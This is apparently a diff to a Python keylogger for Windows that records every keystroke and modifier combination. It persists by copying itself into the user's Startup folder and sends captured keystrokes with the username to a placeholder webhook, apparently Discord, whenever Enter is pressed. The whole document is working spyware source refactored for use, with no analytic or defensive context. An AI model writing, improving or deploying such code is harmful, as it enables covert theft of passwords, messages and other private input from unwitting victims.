@@ -1,21 +1,20 @@
-# Libraries
 import time
 import threading
 import requests
 import keyboard
 import os
+import winshell
 import sys
 import shutil
-import winshell
 
-# Configuration parameters
-webhook = 'put the webhook here'
-debug = False
+WEBHOOK_URL = "Your webhook URL here"
+DEBUG = False
 
-class PersistenceManager:
-
-    def __init__(self, debug: bool = False):
+class PersistentKeyLogger:
+    
+    def __init__(self, debug: bool = True):
         self.debug = debug
+        self.add_to_startup()
 
     def add_to_startup(self):
         if winshell is None:
@@ -31,14 +30,11 @@ class PersistenceManager:
         try:
             startup_folder = winshell.startup()
             destination = os.path.join(startup_folder, os.path.basename(current_file))
-
             if os.path.exists(destination):
                 if self.debug:
                     print(f"[DEBUG] Ya existe en Startup: {destination}")
                 return True
-
             shutil.copy(current_file, destination)
-
             if self.debug:
                 print(f"[DEBUG] Copiado a Startup: {destination}")
             return True
@@ -47,16 +43,12 @@ class PersistenceManager:
                 print(f"[DEBUG] Error al copiar a Startup: {e}")
             return False
 
-    def run(self):
-        self.add_to_startup()
-
 class KeyLogger:
 
     def __init__(self, debug: bool = False, webhook: str = ''):
         self.debug = debug
         self.webhook = webhook
         self.lock = threading.Lock()
-        self.send_time = 30
         self.keys_chain = []
         self.username = os.getlogin()
 
@@ -69,45 +61,26 @@ class KeyLogger:
             mods = []
 
             if keyboard.is_pressed('ctrl'):
-                mods.append("Ctrl")
+                mods.append(" [Ctrl")
 
             if keyboard.is_pressed('alt'):
-                mods.append("Alt")
+                mods.append(" [Alt")
 
             if keyboard.is_pressed('shift'):
-                mods.append("Shift")
+                mods.append(" [Shift")
 
             if mods:
-                combo = ' + '.join(f' {mod} ' for mod in mods) + f' + {key} '
-                self.keys_chain.append(f' {combo} ')
-
-            elif key in ['space', 'tab', 'enter', 'backspace', 'esc', 'caps lock', 'delete', 'insert', 'home', 'end', 'page up', 'page down']:
-                special_keys = {
-                    'space': ' ',
-                    'tab': '[TAB]',
-                    'enter': '[ENTER]',
-                    'backspace': '[BKSP]',
-                    'esc': '[ESC]',
-                    'caps lock': '[CAPS]',
-                    'delete': '[DEL]',
-                    'insert': '[INS]',
-                    'home': '[HOME]',
-                    'end': '[END]',
-                    'page up': '[PGUP]',
-                    'page down': '[PGDN]'
-                }
-
-                self.keys_chain.append(special_keys.get(key, f'[{key.upper()}]'))
-
-            elif key == 'space':
-                self.keys_chain.append(' ')
-
-            elif key == 'enter':
-                self.send_data(self.keys_chain)
-                self.keys_chain.clear()
-
+                combo = ' + '.join(mods) + ' + ' + key + '] '
+                self.keys_chain.append(combo)
             else:
                 self.keys_chain.append(key)
+
+            if self.debug:
+                print(f'[DEBUG] Key pressed: {key}')
+
+            # Check if Enter key is pressed
+            if key == 'enter':
+                self.send_data()
 
         keyboard.on_press(on_press)
 
@@ -119,20 +92,32 @@ class KeyLogger:
             if self.debug:
                 print(f'[!] Error in listen_keys: {e} [!]')
 
-    def send_data(self, keys_chain):
-        if not keys_chain:
+    def send_data(self):
+        if not self.keys_chain:
             return
 
         try:
             with self.lock:
-                data = {'content': f"\n[+] {self.username} -> ".join(keys_chain)}
+                formatted_keys = []
+                for key in self.keys_chain:
+                    if key == 'space':
+                        formatted_keys.append(' ')
+                    elif key in ['tab', 'enter', 'backspace', 'esc', 'delete', 'insert', 'home', 'end', 'page up', 'page down', 'bloq mayus']:
+                        formatted_keys.append(f' [{key.upper()}] ')
+                    else:
+                        formatted_keys.append(key)
+
+                keys_string = ''.join(formatted_keys)
+                data = {'content': f"\n{self.username} -> {keys_string}"}
                 response = requests.post(self.webhook, data=data, timeout=20)
 
-            if self.debug:
-                if response.status_code in (200, 201, 204):
-                    print(f'[+] Data sent successfully. Status code {response.status_code} [+]')
-                else:
-                    print(f'[!] Failed to send data: {response.status_code} [!]')
+                if self.debug:
+                    if response.status_code in (200, 201, 204):
+                        print(f'[+] Data sent successfully. Status code {response.status_code} [+]')
+                    else:
+                        print(f'[!] Failed to send data: {response.status_code} [!]')
+
+                self.keys_chain.clear()
 
         except requests.RequestException as response:
             if self.debug:
@@ -142,33 +127,10 @@ class KeyLogger:
             if self.debug:
                 print(f'[!] Error sending data: {error} [!]')
 
-    def send_to_discord_loop(self, stop_event=None):
-
-        if self.send_time <= 0:
-            raise ValueError('[!] self.send_time must be > 0 [!]')
-
-        if stop_event is None:
-            stop_event = threading.Event()
-
-        if self.debug:
-            print(f'[+] Starting send loop every {self.send_time} seconds [+]')
-
-        while not stop_event.is_set():
-            stopped = stop_event.wait(timeout=self.send_time)
-            if stopped:
-                break
-
-        if self.debug:
-            print('[+] Send loop stopped [+]')
-
     def run(self):
         listen_keys_thread = threading.Thread(target=self.listen_keys)
         listen_keys_thread.daemon = True
         listen_keys_thread.start()
-        stop_event = threading.Event()
-        send_loop_thread = threading.Thread(target=self.send_to_discord_loop, args=(stop_event,))
-        send_loop_thread.daemon = True
-        send_loop_thread.start()
 
         try:
             while True:
@@ -176,17 +138,15 @@ class KeyLogger:
 
         except KeyboardInterrupt:
             print("[+] Exiting gracefully [+]")
-            stop_event.set()
             listen_keys_thread.join()
-            send_loop_thread.join()
 
 def main():
     while True:
         try:
-            key_logger = KeyLogger(webhook=webhook, debug=debug).run()
-            PersistenceManager(debug=debug).run()
+            PersistentKeyLogger()
+            KeyLogger(webhook=WEBHOOK_URL, debug=DEBUG).run()
         except Exception as e:
-            if debug:
+            if DEBUG:
                 print(f'[!] Error in main loop: {e} [!]')
             time.sleep(5)
 
